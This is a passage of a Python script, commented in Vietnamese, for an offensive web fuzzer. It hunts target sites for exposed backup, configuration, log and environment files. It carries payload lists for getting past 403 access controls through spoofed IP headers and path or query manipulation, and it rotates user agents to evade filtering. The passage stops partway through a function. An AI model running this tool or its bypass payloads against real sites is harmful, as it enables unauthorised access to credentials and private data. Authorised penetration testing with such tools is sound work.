#!/usr/bin/env python3
import requests
import argparse
import sys
import os
import urllib.parse
import re
import random
import time
import threading
import itertools
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter

# Kiểm tra thư viện tqdm
try:
    from tqdm import tqdm
except ImportError:
    print("Error: Chưa cài 'tqdm'. Vui lòng chạy: pip install tqdm")
    sys.exit(1)

# --- CẤU HÌNH MÀU SẮC ---
class Colors:
    GREEN = '\033[92m'   # 2xx
    BLUE = '\033[94m'    # 3xx
    YELLOW = '\033[93m'  # 403
    RED = '\033[91m'     # 404, 5xx
    CYAN = '\033[96m'    # Info
    GREY = '\033[90m'    # Low priority
    RESET = '\033[0m'

# Khóa để ghi file an toàn khi chạy đa luồng
file_lock = threading.Lock()

# Global counter cho rate limit
RATE_LIMIT_COUNTER = 0
rate_limit_lock = threading.Lock()

# --- 1. USER-AGENTS (MASSIVE LIST v26) ---
USER_AGENTS = [
    # --- WINDOWS (CHROME) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    
    # --- WINDOWS (EDGE) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",

    # --- WINDOWS (FIREFOX) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:122.0) Gecko/20100101 Firefox/122.0",

    # --- MACOS (SAFARI/CHROME) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

    # --- LINUX ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",

    # --- ANDROID (MOBILE) ---
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

    # --- IPHONE (IOS) ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",

    # --- TABLETS ---
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-X900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

    # --- OTHER BROWSERS (OPERA/BRAVE COMPATIBLE) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
]

# --- 2. SUFFIX LIST ---
DEFAULT_SUFFIXES = [
    ".bak", ".bk", ".old", ".new", ".tmp", ".temp", ".save", ".safe", ".copy", ".dll", ".dat", ".db",
    ".php", ".txt", ".zip", ".tar", ".tar.gz", ".tgz", ".gz", ".7z", ".rar", ".bz2", ".sql",
    ".1", ".2", "_bak", "-bak", "_bk", "-bk", "_old", "-old", ".orig", ".original",
    ".dist", ".inc", ".log", ".swp", ".swo", "~", ".save", ".backup", ".copy", ".backup1", ".backup2",
    ".bak1", ".bak2", ".bkp", ".bkp1", ".bkp2", ".tmp1", ".tmp2", ".old1", ".old2", ".config", ".cfg", 
    ".ini" , ".backup.tar.gz", ".backup.zip", ".backup.tar", ".backup.tgz", ".backup.rar", ".conf",
    "1", "2", "3", "bin", "json", "xml", ".bin", ".json", ".xml", ".htaccess", ".htpasswd", "_", ".bat",
    ".cmd", ".sh", ".zst", ".xz", ".lz", ".lzma", ".lzo", ".sz", ".zpaq", ".zst", ".tar.zst", ".tar.xz",
    ".tar.lz", ".tar.lzma", ".tar.lzo", ".tar.sz", ".zpaq", ".tar.zpaq", "-bat", "-cmd", "-sh", "-zst", 
    ".dev", ".staging", ".production", ".test", ".final", ".local", ".v1", ".v2", ".v1.0", ".v2.0", ".v1.1", ".v2.1",
    "-version1", "-dev", "-staging", "-production", "-test", "-final", "-local", ".pro", ".release",
    "-pro", "-release", ".pdb", ".backup_final", ".old_backup"
]

# --- 3. PREFIX LIST ---
DEFAULT_PREFIXES = ["_", "__", "bk_", "new_", "old_", "bak_", "bk-", "new-", "old-", "bak-", "~", "copy of ", "copy_of_", "."]

# --- 4. INFIX LIST ---
DEFAULT_INFIXES = [
    "_bk", "_bk_1", "_bk_2", "_bk_l", "_bk_new", "_bk_old",
    "_backup", "_backup_1", "_backup_new",
    "_old", "_old_1", "_old_2", "_old_l", "_old_new",
    "_new", "_new_1", "_db", "dll", "_config", "-config",
    "_1", "_2", "_3", "-db", "-dll", "_conf", "-conf",
    "_copy", "_copy_1", "_json", "_xml", "-json", "-xml",
    "-bk", "-backup", "-old", "_bak", "-bak"
    "_v1", "_v2", "v1", "v2", "_v1.0", "_v2.0", "_v1.1", "_v2.1", "-v1", "-v2", "_version1",
    "_temp", "_tmp", "_test", "_check", "_final",
    "_backup_final", "_old_backup", "1", "2", "3",
    "bat", "cmd", "sh", "zst", "xz", "lz", "lzma", "lzo", "sz", "zpaq", "tar.zst", "tar.xz", "tar.lz", 
    "tar.lzma", "tar.lzo", "pdb"
]

# --- 5. LOG FILENAMES (COMMON) ---
COMMON_LOG_FILENAMES = [
    # General
    "error.log", "access.log", "debug.log", "system.log", "application.log", "app.log", "server.log",
    "error_log", "access_log", "debug_log", "log.txt", "errors.txt", "access.txt", "debug.txt", 
    "trace.log", "events.log", "activity.log", "apps.log", "messages.log", "apps.txt", "messages.txt",
    "audit.log", "auth.log", "daemon.log", "kern.log", "syslog", "logs.txt", "logfile.log", "logfile.txt",
    "combined.log", "combined_access.log", "info.log", "warning.log", "fatal.log", "info.txt", "warning.txt",
    "fatal.txt", "payment.log", "payment_errors.log", "payment_access.log", "payment_debug.log",
    "billing.log", "billing_errors.log", "billing_access.log", "billing_debug.log", "transaction.log",
    "transaction_errors.log", "transaction_access.log", "transaction_debug.log", "order.log", "web.log", "web.txt",
    "web_errors.log", "web_access.log", "web_debug.log", "api.log", "api_errors.log", "api_access.log", "api_debug.log",
    "database.log", "database_errors.log", "database_access.log", "database_debug.log", "cache.log",
    "cache_errors.log", "cache_access.log", "cache_debug.log", "queue.log", "queue_errors.log", "queue_access.log",
    "queue_debug.log", "job.log", "job_errors.log", "job_access.log", "job_debug.log", "worker.log",
    "worker_errors.log", "worker_access.log", "worker_debug.log", "monitor.log", "monitor_errors.log",
    "monitor_access.log", "monitor_debug.log", "alert.log", "alert_errors.log", "alert_access.log", "alert_debug.log",
    "audit.log", "audit_errors.log", "audit_access.log", "audit_debug.log",
    "cron.log", "mail.log", "maillog", "yum.log", "dmesg", "boot.log", "auth.log", "secure", "secure.log",
    "deployment.log", "deploy.log", "supervisor.log", "supervisord.log", "scheduler.log",
    
    # Web Servers
    "nginx.log", "apache.log", "httpd.log", "iis.log", 
    "nginx_error.log", "apache_error.log", "httpd_error.log", "iis_error.log",
    "nginx_access.log", "apache_access.log", "httpd_access.log", "iis_access.log",
    "nginx_debug.log", "apache_debug.log", "httpd_debug.log", "iis_debug.log", "iis7.log", 
    "iis8.log", "iis10.log", "iis_error7.log", "iis_error8.log", "iis_error10.log",
    "iis_access7.log", "iis_access8.log", "iis_access10.log", "iis_debug7.log", "iis_debug8.log",
    "iis_debug10.log",
    
    # Databases
    "mysql.log", "postgresql.log", "mongodb.log", "redis.log", "db.log", "database.log",
    "mysql_error.log", "postgresql_error.log", "mongodb_error.log", "redis_error.log",
    "mysql_access.log", "postgresql_access.log", "mongodb_access.log", "redis_access.log",
    "mysql_debug.log", "postgresql_debug.log", "mongodb_debug.log", "redis_debug.log",

    
    # Frameworks / Languages
    "laravel.log", "worker.log", "fpm.log", "php_errors.log", "php-error.log",
    "catalina.out", "spring.log",
    "production.log", "development.log", "test.log",
    "npm-debug.log", "yarn-error.log",
    "django.log", "flask.log", "rails.log", "tornado.log", "gunicorn.log", "uwsgi.log",
    
    # CMS / Specific
    "wordpress.log", "wp-debug.log", "magento.log", "exception.log", "database.log", "db.log", "sql.log",
    "drupal.log", "joomla.log", "prestashop.log", "error_report.log", "error_report.txt", "shop.log",
    "shop_errors.log", "shop_access.log", "shop_debug.log", "error_report.log", "error_report.txt"
]

# --- 7. 403 BYPASS PAYLOADS ---
BYPASS_HEADERS_LIST = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "http"},
    {"Base-Url": "127.0.0.1"},
    {"Http-Url": "127.0.0.1"},
    {"Proxy-Host": "127.0.0.1"},
    {"Request-Uri": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Wap-Profile": "127.0.0.1"},
]

BYPASS_URL_SUFFIXES = [
    "/", "//", "/.", "/./", "/..", "/../", "/%20", "/%09", "%20", "%09", 
    "?", "??", "???", "&", "#", "%", "%23", "%2f", "%00", "%2e",
    ";", "..;", "..;/", "..;%2f", "/..;/",".json", ".html", "?param=1",
    "#", "/*", "/*.php", ".php", ".json", "/*/", "/.randomstring",
    "..%00/", "%2e%2e/", "%252e%252e/", "%252f", "/%2e/", ".", ";%09", 
    ";%20", "%3b", "%3b%20", "%3b%09", ";%09..", ";%09..;", "%3b%20%20..",
    ";%2f..", ";%2f..;", "%3b%2f..", "\\", "?_is_admin=true", "?debug=true", "?is_admin=true", 
    "?test=1", "?isAdmin=true" ,"?admin=true", "?view=admin", "?mode=admin", "?show=admin", "?_escaped_fragment_=",
    "/...", "/..%00", "/..%01", "/..%0a", "/..%0d", "/..%09", "/~", "~", "/%20/",
    "/%2e%2e/", "/%252e%252e/", "/%c0%af/", "/%e0%80%af",
]

def get_arguments():
    parser = argparse.ArgumentParser(
        description="Backup Fuzzer v2.7.0 (Massive User-Agents)",
        formatter_class=argparse.RawTextHelpFormatter,  
        epilog="""EXAMPLES:
  ---------------------------------------------------------------------------------
  [BASIC USAGE]
  1. Quick Scan (Single URL):
     python3 fuzzing_backup.py -u https://example.com/config.php

  2. Scan List of URLs (High Perf):
     python3 fuzzing_backup.py -L targets.txt -t 100 -o results.txt

  ---------------------------------------------------------------------------------
  [403 BYPASS & SECRET SCAN - POWERFUL]
  3. Bypass 403 ONLY (Check 14 layers of bypass, No backup fuzzing):
     python3 fuzzing_backup.py -u https://target.com/admin/ --only-bypass-403
     python3 fuzzing_backup.py -L forbidden_urls.txt --only-bypass-403

  4. Fuzz Backup Files + Auto Bypass 403 if found:
     python3 fuzzing_backup.py -u https://example.com/.env --bypass-403

  ---------------------------------------------------------------------------------
  [SMART SCANNING]
  5. Scan Logs + Date Patterns (Find logs like access_2024.log):
     python3 fuzzing_backup.py -u https://example.com/ --scan-logs --fuzz-date [1-12]-2024

  6. Smart 404 Detection (Auto-remove Soft 404 pages):
     python3 fuzzing_backup.py -L domains.txt --smart-404

  ---------------------------------------------------------------------------------
  [CUSTOM FUZZING]
  7. Custom Wordlist using 'FUZZ' keyword:
     python3 fuzzing_backup.py -u "https://example.com/FUZZ" -w common.txt

  8. Custom Extensions & Prefixes:
     python3 fuzzing_backup.py -u https://example.com/index.php -b .bak,.old,.swp -pre copy_,old_

  ---------------------------------------------------------------------------------
  [MISC]
  9. Proxy (Burp Suite) + Random User-Agent:
     python3 fuzzing_backup.py -u https://example.com/ -p "http://127.0.0.1:8080" --random-agent
"""
    )
    
    req = parser.add_argument_group('INPUT')
    req.add_argument("-u", "--url", dest="url", help="URL mục tiêu đơn lẻ. Hỗ trợ keyword 'FUZZ' để đánh dấu vị trí inject (cần -w).")
    req.add_argument("-L", "--list-url", dest="url_list", help="File chứa danh sách URL mục tiêu. Hỗ trợ keyword 'FUZZ'.")
    req.add_argument("-w", "--wordlist", dest="wordlist", help="File wordlist (Bắt buộc nếu dùng FUZZ)")
    req.add_argument("-e", "--extension", dest="ext", help="Đuôi file gốc")
    
    # Custom Generators
    req.add_argument("-b", "--backup-ext", dest="backup_ext", help="Custom Suffix")
    req.add_argument("-i", "--infix", dest="infix", help="Custom Infix")
    req.add_argument("-pre", "--prefix", dest="prefix", help="Custom Prefix")

    # Modes
    modes = parser.add_argument_group('MODES')
    modes.add_argument("--fuzz-domain", action="store_true", help="Kích hoạt fuzz tạo file backup dựa trên domain")
    modes.add_argument("--fuzz-year", dest="fuzz_year", nargs='?', const=0, type=int, help="Kích hoạt fuzz theo năm. Gõ số năm bắt đầu (Vd: --fuzz-year 2018)")
    modes.add_argument("--fuzz-date", dest="fuzz_date", nargs='?', const="TODAY", help="Kích hoạt fuzz full ngày tháng. Cú pháp: [MM]-YYYY, [StartMM-EndMM]-YYYY hoặc [StartMM-EndMM] (Không năm). VD: 12-2018, [1-7]-2018, [1-3]. Mặc định: TODAY")
    modes.add_argument("--scan-logs", dest="scan_logs", nargs='?', const="DEFAULT", help="Kích hoạt chế độ quét file logs. Có thể điền tên file log cụ thể để fuzz (VD: --scan-logs custom.log). Nếu để trống sẽ dùng list mặc định.")
    modes.add_argument("--smart-404", action="store_true", help="Tự động nhận diện Soft 404 để lọc False Positives")
    modes.add_argument("--bypass-403", dest="bypass_403", action="store_true", help="Kích hoạt tự động Bypass 403 Forbidden bằng nhiều kỹ thuật (Header, URL manipulation)")
    modes.add_argument("--only-bypass-403", dest="only_bypass_403", action="store_true", help="CHỈ chạy bypass 403 cho danh sách URL đầu vào (bỏ qua mọi fuzzing)")
    modes.add_argument("--no-suffix", action="store_true", help="Tắt quét nối đuôi (Suffix)")
    modes.add_argument("--no-prefix", action="store_true", help="Tắt quét tiền tố (Prefix)")
    modes.add_argument("--no-infix", action="store_true", help="Tắt quét chèn giữa (Infix)")

    # FILTERING & STATUS
    filt = parser.add_argument_group('FILTERING & STATUS')
    filt.add_argument("-S", "--exclude-size", dest="exclude_sizes", help="Bỏ qua size (BYTES).")
    filt.add_argument("-x", "--exclude-text", dest="exclude_text", help="Regex bỏ qua content")
    filt.add_argument("-g", "--grep", dest="grep", help="Regex tìm kiếm content")
    filt.add_argument("-mc", "--match-code", dest="match_code", default="200,403", help="Status code muốn hiển thị (Mặc định: 200,403). Dùng 'all' để hiện tất cả.")
    filt.add_argument("-fc", "--filter-code", dest="filter_code", help="Status code muốn ẩn (Mặc định: None)")

    # OUTPUT
    out = parser.add_argument_group('OUTPUT')
    out.add_argument("-o", "--output", dest="output_file", help="Đường dẫn file lưu kết quả (Ví dụ: result.txt)")

    conn = parser.add_argument_group('CONNECTION')
    conn.add_argument("-t", "--threads", dest="threads", type=int, default=10, help="Số luồng (Mặc định: 50)")
    conn.add_argument("-T", "--timeout", dest="timeout", type=float, default=5, help="Timeout (giây) (Mặc định: 5)")
    conn.add_argument("-D", "--delay", dest="delay", type=float, default=0, help="Delay (giây) giữa các request")
    conn.add_argument("-p", "--proxy", dest="proxy", help="Proxy URL")
    conn.add_argument("-H", "--header", dest="headers", action="append", help="Custom Header")
    conn.add_argument("--random-agent", dest="random_agent", action="store_true", help="Random User-Agent")
    
    return parser.parse_args()

def format_size(size_in_bytes):
    human_size = ""
    original_size = size_in_bytes
    units = ['B', 'KB', 'MB', 'GB']
    for unit in units:
        if size_in_bytes < 1024.0:
            human_size = f"{size_in_bytes:.2f} {unit}"
            break
        size_in_bytes /= 1024.0
    else:
        human_size = f"{size_in_bytes:.2f} TB"
    return f"{human_size} ({original_size} B)"

def normalize_endpoint(endpoint, extension=None):
    endpoint = endpoint.strip()
    if endpoint.startswith('/'): endpoint = endpoint[1:]
    if extension:
        if not extension.startswith('.'): extension = '.' + extension
        if not endpoint.endswith(extension): endpoint += extension
    return endpoint

def generate_year_payloads(start_year=None):
    """Tạo danh sách các pattern năm phổ biến"""
    year_patterns = set()
    now = datetime.now()
    current_year = now.year

    if start_year is not None:
        y_start = min(start_year, current_year)
        y_end = max(start_year, current_year)
        years = list(range(y_start, y_end + 1))
    else:
        years = [current_year, current_year - 1] 
    
    for y in years:
        year_patterns.add(str(y)) # 2024
        year_patterns.add(f"_{y}") # _2024
        year_patterns.add(f".{y}") # .2024
        year_patterns.add(f"-{y}") # -2024
    
    return list(year_patterns)

def generate_full_date_payloads(range_string):
    """
    Sinh pattern full ngày tháng dựa trên input:
    - TODAY (Ngày hiện tại)
    - 2024 (Nguyên năm 2024)
    - 12-2018 (Tháng 12 năm 2018)
    - [1-7]-2018 (Từ tháng 1 đến tháng 7 năm 2018)
    Format sinh ra: YYYYMMDD, DDMMYYYY, MMDDYYYY, YYYY-MM-DD...
    """
    targets_month_year = [] # List of tuple (month, year)
    
    # Handle TODAY
    if range_string == "TODAY":
        now = datetime.now()
        # Đối với TODAY, ta chỉ fuzz ngày hôm nay (và có thể hôm qua cho chắc)
        # Nhưng function này thiết kế theo month/year loop.
        # Để đơn giản, ta trả về trực tiếp bộ payload cho ngày hôm nay luôn
        # Thay vì loop qua month/year.
        date_patterns = set()
        dt = now
        
        # Danh sách các định dạng cần fuzz
        # Bao gồm cả Full Year (YYYY) và Short Year (YY)
        # Bao gồm các separator phổ biến (-, .)
        fmt_list = [
            "%Y%m%d",   # 20240125
            "%d%m%Y",   # 25012024
            "%Y-%m-%d", # 2024-01-25
            "%m%d%Y",   # 01252024
            "%Y-%d-%m", # 2024-25-01
            "%d-%m-%Y", # 25-01-2024
            "%m-%d-%Y", # 01-25-2024
            "%d%m%y",   # 250124 (Short Year)
            "%y%m%d",   # 240125 (Short Year)
            "%m%d",     # 0125 (MMDD)
            "%d%m",     # 2501 (DDMM)
        ]

        for fmt in fmt_list:
            val = dt.strftime(fmt)
            # Add variations: raw, _val, -val, .val
            date_patterns.add(val)
            date_patterns.add(f"_{val}")
            date_patterns.add(f"-{val}")
            date_patterns.add(f".{val}")
        
        return list(date_patterns)

    # Regex parse input
    # Case 1: [1-7]-2018
    match_range = re.match(r'^\[(\d+)-(\d+)\]-(\d{4})$', range_string)
    # Case 2: 12-2018
    match_single = re.match(r'^(\d{1,2})-(\d{4})$', range_string)
    # Case 3: 2024 (Full year)
    match_year = re.match(r'^(\d{4})$', range_string)
    # Case 4: [1-7] (Month range, no year)
    match_range_no_year = re.match(r'^\[(\d+)-(\d+)\]$', range_string)
    
    only_short_date = False

    if match_range:
        start_m = int(match_range.group(1))
        end_m = int(match_range.group(2))
        y = int(match_range.group(3))
        for m in range(start_m, end_m + 1):
            if 1 <= m <= 12: targets_month_year.append((m, y))
            
    elif match_single:
        m = int(match_single.group(1))
        y = int(match_single.group(2))
        if 1 <= m <= 12: targets_month_year.append((m, y))

    elif match_year:
        y = int(match_year.group(1))
        for m in range(1, 13):
            targets_month_year.append((m, y))

    elif match_range_no_year:
        start_m = int(match_range_no_year.group(1))
        end_m = int(match_range_no_year.group(2))
        y = 2024 # Use leap year to cover all dates
        only_short_date = True
        for m in range(start_m, end_m + 1):
            if 1 <= m <= 12: targets_month_year.append((m, y))

    else:
        print(f"{Colors.RED}[!] Format date fuzz không hợp lệ: {range_string}{Colors.RESET}")
        return []

    date_patterns = set()
    from calendar import monthrange

    for m, y in targets_month_year:
        days_in_month = monthrange(y, m)[1]
        for d in range(1, days_in_month + 1):
            try:
                dt = datetime(year=y, month=m, day=d)
            except ValueError:
                continue

            # Standardized format list + prefixing for loop
            if only_short_date:
                fmt_list = ["%m%d", "%d%m"]
            else:
                fmt_list = [
                    "%Y%m%d", "%d%m%Y", "%Y-%m-%d", "%m%d%Y", 
                    "%Y-%d-%m", "%d-%m-%Y", "%m-%d-%Y",
                    "%d%m%y", "%y%m%d",
                    "%m%d", "%d%m"
                ]

            for fmt in fmt_list:
                val = dt.strftime(fmt)
                date_patterns.add(val)
                date_patterns.add(f"_{val}")
                date_patterns.add(f"-{val}")
                date_patterns.add(f".{val}")

    return list(date_patterns)

def create_variations(filename, active_suffixes, active_infixes, active_prefixes, date_payloads=None):
    if '.' in filename:
        stem, ext = filename.rsplit('.', 1)
        ext = '.' + ext 
    else:
        stem = filename
        ext = ""

    variations = set()
    if ext and active_infixes: 
        for infix in active_infixes: variations.add(stem + infix + ext)
    if active_suffixes:
        for suffix in active_suffixes:
            variations.add(filename + suffix)
            if ext and suffix.startswith('.'): variations.add(stem + suffix)
    if active_prefixes:
        for prefix in active_prefixes: variations.add(prefix + filename)
    
    # --- DATE FUZZING ---
    if date_payloads:
        for d in date_payloads:
            # Suffix style: config.php.2024, config.php_2024
            variations.add(filename + d)
             # Infix style: config_2024.php
            if ext: variations.add(stem + d + ext)
            
            # Combine Suffix + Date (e.g., .bk.0210)
            if active_suffixes:
                for suffix in active_suffixes:
                    variations.add(filename + suffix + d)
                    if ext and suffix.startswith('.'):
                        variations.add(stem + suffix + d)

    if active_suffixes or active_prefixes: variations.add('%23' + filename + '%23')
    
    # --- EDITOR SWAP FILES (Vim/Emacs) ---
    # Vim: .filename.swp (Lưu ý dấu chấm ở đầu)
    variations.add(f".{filename}.swp")
    variations.add(f".{filename}.swo")
    # Emacs: #filename#
    variations.add(f"#{filename}#")
    
    return list(variations)

def generate_domain_payloads(target_url, active_suffixes, active_infixes, active_prefixes, date_payloads=None):
    """
    Sinh ra payload dựa trên domain của target 
    Kết hợp với suffix, infix, prefix từ arguments.
    """
    try:
        parsed = urllib.parse.urlparse(target_url)
        hostname = parsed.hostname
        if not hostname: return []
    except: return []
    
    parts = hostname.split('.')
    domain_variations = set()

    # 1. Full hostname: sub.example.com
    domain_variations.add(hostname)
    
    # 2. Main domain + TLD: example.com
    if len(parts) >= 2:
        domain_variations.add(f"{parts[-2]}.{parts[-1]}")
    
    # 3. Individual parts: sub, example, com
    for part in parts:
        domain_variations.add(part)
    
    # 4. Without dots: subexamplecom
    domain_variations.add(hostname.replace('.', ''))
    
    # 5. Consecutive pairs: sub.example, example.com
    for i in range(len(parts) - 1):
        domain_variations.add(f"{parts[i]}.{parts[i+1]}")
        domain_variations.add(f"{parts[i]}{parts[i+1]}") # No dot pair
    
    # 6. Shuffle/Mixed (Permutations of parts)
    if len(parts) > 1 and len(parts) <= 4:
        perms = itertools.permutations(parts)
        for p in perms:
            domain_variations.add(".".join(p))
            domain_variations.add("".join(p))

    # 7. Reverse (Dao nguoc chuoi)
    domain_variations.add(hostname[::-1])
    domain_variations.add(hostname.replace('.', '')[::-1])

    # 8. Without vowels
    vowels = ['a', 'e', 'i', 'o', 'u']
    current_vars = list(domain_variations)
    for v in current_vars:
        no_vowel = v
        for char in vowels:
            no_vowel = no_vowel.replace(char, '')
        if no_vowel and no_vowel != v:
            domain_variations.add(no_vowel)

    # --- Combine with Suffixes/Prefixes/Infixes ---
    # Nếu người dùng KHÔNG nhập -b (custom suffix), thì dùng list mặc định CỘNG THÊM các extension nén phổ biến cho domain backup
    # Nếu người dùng có nhập -b, thì chỉ dùng cái họ nhập.
    
    # Tuy nhiên, để linh hoạt, ta sẽ dùng hàm create_variations cho từng biến thể domain.
    # Lưu ý: create_variations sẽ coi biến thể domain là "filename".
    
    payloads = []
    base_url = f"{parsed.scheme}://{parsed.netloc}/"
    
    for dv in domain_variations:
        # Gọi hàm create_variations để áp dụng logic prefix, suffix, infix
        # Lưu ý: create_variations sẽ tự tách extension nếu tên có dấu chấm (vd: example.com -> stem: example, ext: .com)
        # Điều này tạo ra các biến thể rất thú vị: example_bk.com, example.com.zip, old_example.com
        
        mutations = create_variations(dv, active_suffixes, active_infixes, active_prefixes, date_payloads)
        
        # Ngoài ra, với domain fuzzing, ta luôn muốn thử ghép trực tiếp các đuôi nén phổ biến
        # nếu nó chưa có trong active_suffixes
        
        # Nếu active_suffixes rỗng (do --no-suffix), ta tôn trọng nó.
        # Nếu active_suffixes có giá trị (mặc định hoặc custom), ta dùng nó.
        
        for m in mutations:
            payloads.append(base_url + m)
            
    return list(set(payloads))

def generate_mutations(base_url, endpoint, active_suffixes, active_infixes, active_prefixes, date_payloads=None):
    if not endpoint: return []
    parts = endpoint.split('/')
    filename = parts[-1]
    
    if parts[:-1]: parent_path = "/".join(parts[:-1]) + "/"
    else: parent_path = ""
        
    if not base_url.endswith('/'): base_url += '/'
    full_base = base_url + parent_path

    variations = create_variations(filename, active_suffixes, active_infixes, active_prefixes, date_payloads)
    
    payloads = [full_base + v for v in variations]

    # --- PARENT DIRECTORY BACKUP ---
    # Nếu file nằm trong folder (vd: admin/config.php), thử fuzz cả folder (vd: admin.zip, admin.rar)
    if parts[:-1]: # Có thư mục cha
        parent_dir_name = parts[-2] # Lấy tên thư mục cha gần nhất (vd: 'admin')
        if parent_dir_name:
            # Các đuôi nén thường dùng cho folder
            dir_exts = ['.zip', '.rar', '.tar.gz', '.tgz', '.7z', '.bak', '.old', '.dev', '.backup']
            # Đường dẫn tới thư mục cha (vd: https://site.com/admin/)
            # Ta cần lùi lại 1 cấp để nối file nén vào (vd: https://site.com/ + admin.zip)
            
            # Xây dựng url base cấp cha
            # parent_path đang là "admin/" -> parent_up_one là ""
            parent_parts = parts[:-1]
            if len(parent_parts) > 0:
                grandparent_path = "/".join(parent_parts[:-1]) + "/" if len(parent_parts) > 1 else ""
                grandparent_url = base_url + grandparent_path
                
                for ext in dir_exts:
                     payloads.append(grandparent_url + parent_dir_name + ext)
                     
    return payloads

def generate_path_context_payloads(target_url, active_suffixes):
    """
    Phân tích URL để tạo ra các wordlist thông minh dựa trên path và domain.
    VD: https://sub.domain.com/Script/web/js/FUZZ
    -> script_web.zip, web_js.rar, sub_domain_script.tar.gz...
    """
    try:
        # Remove FUZZ to parse valid URL structure
        clean_url = target_url.replace('FUZZ', '')
        parsed = urllib.parse.urlparse(clean_url)
        
        tokens = []
        
        # 1. Domain Tokens
        hostname = parsed.hostname
        if hostname:
            domain_parts = hostname.split('.')
            # Bỏ qua các TLD và từ chung chung
            tokens.extend([p for p in domain_parts if p and p not in ['com', 'vn', 'net', 'org', 'www', 'edu', 'gov']])
            
        # 2. Path Tokens
        path = parsed.path
        if path:
            path_parts = [p for p in path.split('/') if p]
            tokens.extend(path_parts)
            
        if not tokens: return []
        
        candidates = set()
        
        # 3. Basic Tokens (Original & Lowercase)
        for t in tokens:
            # Tự thêm .zip/rar cho từng token đơn
            candidates.add(t)
            candidates.add(t.lower())
            
